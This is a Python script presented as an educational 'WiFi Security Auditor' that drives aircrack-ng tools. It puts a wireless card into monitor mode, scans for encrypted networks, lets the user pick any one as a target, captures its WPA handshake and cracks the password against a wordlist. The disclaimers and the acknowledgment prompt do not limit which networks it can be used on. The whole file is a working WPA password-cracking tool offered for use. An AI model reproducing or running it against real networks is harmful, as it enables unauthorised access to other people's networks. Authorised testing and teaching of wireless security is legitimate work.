#!/usr/bin/env python3
"""
WiFi Security Auditor - Educational Penetration Testing Tool
Author: Cybersecurity Educational Project
License: MIT (Educational Use Only)

LEGAL DISCLAIMER:
This tool is for EDUCATIONAL PURPOSES ONLY and authorized security testing.
Unauthorized access to computer networks is illegal under:
- Computer Fraud and Abuse Act (CFAA) in the USA
- Computer Misuse Act in the UK
- Similar laws in other jurisdictions

YOU MUST:
- Only use on networks you own or have explicit written permission to test
- Comply with all local, state, and federal laws
- Use for educational and authorized penetration testing only

THE AUTHOR IS NOT RESPONSIBLE FOR ANY MISUSE OF THIS TOOL.
"""

import subprocess
import sys
import os
import time
import argparse
from datetime import datetime
import re

class Colors:
    """ANSI color codes for terminal output"""
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class WiFiAuditor:
    """WiFi Security Auditing Tool for Educational Purposes"""
    
    def __init__(self):
        self.interface = None
        self.target_bssid = None
        self.target_channel = None
        self.target_essid = None
        self.wordlist_path = None
        
    def print_banner(self):
        """Display tool banner and legal warning"""
        banner = f"""
{Colors.HEADER}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║           WiFi Security Auditor v1.0                         ║
║           Educational Penetration Testing Tool               ║
╚══════════════════════════════════════════════════════════════╝
{Colors.ENDC}
{Colors.WARNING}{Colors.BOLD}
⚠️  LEGAL WARNING ⚠️
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
This tool is for AUTHORIZED SECURITY TESTING ONLY.

Unauthorized access to WiFi networks is ILLEGAL and punishable by:
• Fines up to $250,000
• Prison sentences up to 20 years
• Civil lawsuits and damages

By using this tool, you agree that:
✓ You own the network OR have written authorization
✓ You understand applicable laws in your jurisdiction
✓ You accept full legal responsibility for your actions
✓ The author is NOT liable for any misuse

Press Ctrl+C now if you do not agree.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{Colors.ENDC}
"""
        print(banner)
        
    def check_root(self):
        """Verify root privileges"""
        if os.geteuid() != 0:
            print(f"{Colors.FAIL}[!] This tool requires root privileges.{Colors.ENDC}")
            print(f"{Colors.WARNING}[*] Please run with: sudo python3 {sys.argv[0]}{Colors.ENDC}")
            sys.exit(1)
        print(f"{Colors.OKGREEN}[✓] Root privileges confirmed{Colors.ENDC}")
        
    def check_dependencies(self):
        """Check if required tools are installed"""
        print(f"\n{Colors.OKBLUE}[*] Checking dependencies...{Colors.ENDC}")
        
        required_tools = {
            'airmon-ng': 'aircrack-ng',
            'airodump-ng': 'aircrack-ng',
            'aircrack-ng': 'aircrack-ng',
            'aireplay-ng': 'aircrack-ng'
        }
        
        missing = []
        for tool, package in required_tools.items():
            try:
                subprocess.run(['which', tool], check=True, 
                             capture_output=True, text=True)
                print(f"{Colors.OKGREEN}  [✓] {tool} found{Colors.ENDC}")
            except subprocess.CalledProcessError:
                print(f"{Colors.FAIL}  [✗] {tool} not found{Colors.ENDC}")
                missing.append(package)
        
        if missing:
            print(f"\n{Colors.FAIL}[!] Missing dependencies!{Colors.ENDC}")
            print(f"{Colors.WARNING}[*] Install with: pkg install {' '.join(set(missing))}{Colors.ENDC}")
            sys.exit(1)
            
        print(f"{Colors.OKGREEN}[✓] All dependencies satisfied{Colors.ENDC}")
        
    def get_interfaces(self):
        """List available wireless interfaces"""
        print(f"\n{Colors.OKBLUE}[*] Detecting wireless interfaces...{Colors.ENDC}")
        
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True, stderr=subprocess.STDOUT)
            interfaces = []
            
            for line in result.stdout.split('\n'):
                if 'IEEE 802.11' in line or 'ESSID' in line:
                    interface = line.split()[0]
                    if interface:
                        interfaces.append(interface)
                        print(f"{Colors.OKGREEN}  [✓] Found: {interface}{Colors.ENDC}")
            
            return interfaces
        except Exception as e:
            print(f"{Colors.FAIL}[!] Error detecting interfaces: {e}{Colors.ENDC}")
            return []
    
    def enable_monitor_mode(self, interface):
        """Enable monitor mode on wireless interface"""
        print(f"\n{Colors.OKBLUE}[*] Enabling monitor mode on {interface}...{Colors.ENDC}")
        
        try:
            # Kill interfering processes
            print(f"{Colors.WARNING}[*] Killing interfering processes...{Colors.ENDC}")
            subprocess.run(['airmon-ng', 'check', 'kill'], 
                         capture_output=True, check=False)
            
            # Enable monitor mode
            result = subprocess.run(['airmon-ng', 'start', interface], 
                                  capture_output=True, text=True)
            
            # Monitor interface is usually interface + 'mon'
            mon_interface = interface + 'mon'
            
            # Verify monitor mode
            verify = subprocess.run(['iwconfig', mon_interface], 
                                  capture_output=True, text=True)
            
            if 'Mode:Monitor' in verify.stdout:
                print(f"{Colors.OKGREEN}[✓] Monitor mode enabled: {mon_interface}{Colors.ENDC}")
                return mon_interface
            else:
                print(f"{Colors.FAIL}[!] Failed to enable monitor mode{Colors.ENDC}")
                return None
                
        except Exception as e:
            print(f"{Colors.FAIL}[!] Error enabling monitor mode: {e}{Colors.ENDC}")
            return None
    
    def scan_networks(self, interface):
        """Scan for available WiFi networks"""
        print(f"\n{Colors.OKBLUE}[*] Scanning for WiFi networks...{Colors.ENDC}")
        print(f"{Colors.WARNING}[*] Press Ctrl+C to stop scanning{Colors.ENDC}\n")
        
        output_file = f"/tmp/wifi_scan_{int(time.time())}"
        
        try:
            # Start airodump-ng
            process = subprocess.Popen(
                ['airodump-ng', interface, '-w', output_file, '--output-format', 'csv'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Let it run for a bit
            time.sleep(15)
            process.terminate()
            
            # Parse results
            networks = self.parse_airodump_csv(output_file + '-01.csv')
            return networks
            
        except KeyboardInterrupt:
            print(f"\n{Colors.WARNING}[*] Scan stopped by user{Colors.ENDC}")
            process.terminate()
            networks = self.parse_airodump_csv(output_file + '-01.csv')
            return networks
        except Exception as e:
            print(f"{Colors.FAIL}[!] Error scanning networks: {e}{Colors.ENDC}")
            return []
    
    def parse_airodump_csv(self, csv_file):
        """Parse airodump-ng CSV output"""
        networks = []
        
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
                
            in_networks = False
            for line in lines:
                if 'BSSID' in line and 'ESSID' in line:
                    in_networks = True
                    continue
                    
                if in_networks and line.strip() and not line.startswith('Station'):
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) >= 14:
                        network = {
                            'bssid': parts[0],
                            'channel': parts[3],
                            'encryption': parts[5],
                            'power': parts[8],
                            'essid': parts[13]
                        }
                        if network['essid'] and network['encryption'] != 'OPN':
                            networks.append(network)
                            
        except Exception as e:
            print(f"{Colors.FAIL}[!] Error parsing scan results: {e}{Colors.ENDC}")
            
        return networks
    
    def display_networks(self, networks):
        """Display discovered networks"""
        print(f"\n{Colors.HEADER}{Colors.BOLD}Discovered Networks:{Colors.ENDC}\n")
        print(f"{'#':<4} {'ESSID':<32} {'BSSID':<18} {'CH':<4} {'PWR':<5} {'ENC':<10}")
        print("─" * 80)
        
        for i, net in enumerate(networks, 1):
            print(f"{i:<4} {net['essid']:<32} {net['bssid']:<18} "
                  f"{net['channel']:<4} {net['power']:<5} {net['encryption']:<10}")
    
    def capture_handshake(self, interface, bssid, channel, essid):
        """Capture WPA handshake"""
        print(f"\n{Colors.OKBLUE}[*] Capturing handshake for {essid}...{Colors.ENDC}")
        print(f"{Colors.WARNING}[*] Target: {bssid} on channel {channel}{Colors.ENDC}")
        print(f"{Colors.WARNING}[*] This may take several minutes...{Colors.ENDC}")
        
        output_file = f"/tmp/handshake_{bssid.replace(':', '')}"
        
        # Start capture
        print(f"\n{Colors.OKBLUE}[*] Starting packet capture...{Colors.ENDC}")
        capture_cmd = [
            'airodump-ng',
            '--bssid', bssid,
            '--channel', channel,
            '-w', output_file,
            interface
        ]
        
        print(f"{Colors.WARNING}[*] Waiting for handshake... (Press Ctrl+C when captured){Colors.ENDC}")
        
        try:
            subprocess.run(capture_cmd)
        except KeyboardInterrupt:
            print(f"\n{Colors.WARNING}[*] Capture stopped{Colors.ENDC}")
        
        return output_file + '-01.cap'
    
    def crack_password(self, capture_file, wordlist):
        """Attempt to crack password using wordlist"""
        print(f"\n{Colors.OKBLUE}[*] Starting password cracking...{Colors.ENDC}")
        print(f"{Colors.WARNING}[*] Using wordlist: {wordlist}{Colors.ENDC}")
        
        if not os.path.exists(wordlist):
            print(f"{Colors.FAIL}[!] Wordlist not found: {wordlist}{Colors.ENDC}")
            return None
        
        try:
            result = subprocess.run(
                ['aircrack-ng', capture_file, '-w', wordlist],
                capture_output=True,
                text=True
            )
            
            # Parse output for password
            if 'KEY FOUND' in result.stdout:
                for line in result.stdout.split('\n'):
                    if 'KEY FOUND' in line:
                        password = line.split('[')[1].split(']')[0].strip()
                        print(f"\n{Colors.OKGREEN}{Colors.BOLD}[✓] PASSWORD FOUND: {password}{Colors.ENDC}")
                        return password
            else:
                print(f"{Colors.FAIL}[!] Password not found in wordlist{Colors.ENDC}")
                return None
                
        except Exception as e:
            print(f"{Colors.FAIL}[!] Error during cracking: {e}{Colors.ENDC}")
            return None
    
    def cleanup(self, interface):
        """Disable monitor mode and cleanup"""
        print(f"\n{Colors.OKBLUE}[*] Cleaning up...{Colors.ENDC}")
        
        try:
            subprocess.run(['airmon-ng', 'stop', interface], 
                         capture_output=True)
            print(f"{Colors.OKGREEN}[✓] Monitor mode disabled{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.WARNING}[!] Cleanup warning: {e}{Colors.ENDC}")

def main():
    """Main execution function"""
    parser = argparse.ArgumentParser(
        description='WiFi Security Auditor - Educational Tool',
        epilog='Use responsibly and legally!'
    )
    parser.add_argument('-i', '--interface', help='Wireless interface to use')
    parser.add_argument('-w', '--wordlist', help='Wordlist file for password cracking')
    parser.add_argument('--auto', action='store_true', help='Automated mode (requires -i and -w)')
    
    args = parser.parse_args()
    
    auditor = WiFiAuditor()
    auditor.print_banner()
    
    # Legal acknowledgment
    try:
        input(f"\n{Colors.BOLD}Press ENTER to acknowledge and continue, or Ctrl+C to exit...{Colors.ENDC}\n")
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[*] Exiting...{Colors.ENDC}")
        sys.exit(0)
    
    # Check prerequisites
    auditor.check_root()
    auditor.check_dependencies()
    
    # Get or detect interface
    if args.interface:
        interface = args.interface
    else:
        interfaces = auditor.get_interfaces()
        if not interfaces:
            print(f"{Colors.FAIL}[!] No wireless interfaces found{Colors.ENDC}")
            sys.exit(1)
        interface = interfaces[0]
    
    # Enable monitor mode
    mon_interface = auditor.enable_monitor_mode(interface)
    if not mon_interface:
        sys.exit(1)
    
    try:
        # Scan for networks
        networks = auditor.scan_networks(mon_interface)
        
        if not networks:
            print(f"{Colors.FAIL}[!] No networks found{Colors.ENDC}")
            auditor.cleanup(mon_interface)
            sys.exit(1)
        
        # Display networks
        auditor.display_networks(networks)
        
        # Select target
        try:
            choice = int(input(f"\n{Colors.BOLD}Select target network (1-{len(networks)}): {Colors.ENDC}"))
            if choice < 1 or choice > len(networks):
                raise ValueError
            target = networks[choice - 1]
        except (ValueError, KeyboardInterrupt):
            print(f"\n{Colors.WARNING}[*] Invalid selection{Colors.ENDC}")
            auditor.cleanup(mon_interface)
            sys.exit(1)
        
        # Capture handshake
        cap_file = auditor.capture_handshake(
            mon_interface,
            target['bssid'],
            target['channel'],
            target['essid']
        )
        
        # Crack password if wordlist provided
        if args.wordlist:
            auditor.crack_password(cap_file, args.wordlist)
        else:
            print(f"\n{Colors.WARNING}[*] No wordlist provided. Handshake saved to: {cap_file}{Colors.ENDC}")
            print(f"{Colors.OKBLUE}[*] You can crack it later with:{Colors.ENDC}")
            print(f"    aircrack-ng {cap_file} -w <wordlist>")
        
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[*] Operation cancelled by user{Colors.ENDC}")
    finally:
        auditor.cleanup(mon_interface)
    
    print(f"\n{Colors.OKGREEN}[✓] Done!{Colors.ENDC}\n")

if __name__ == '__main__':
    main()
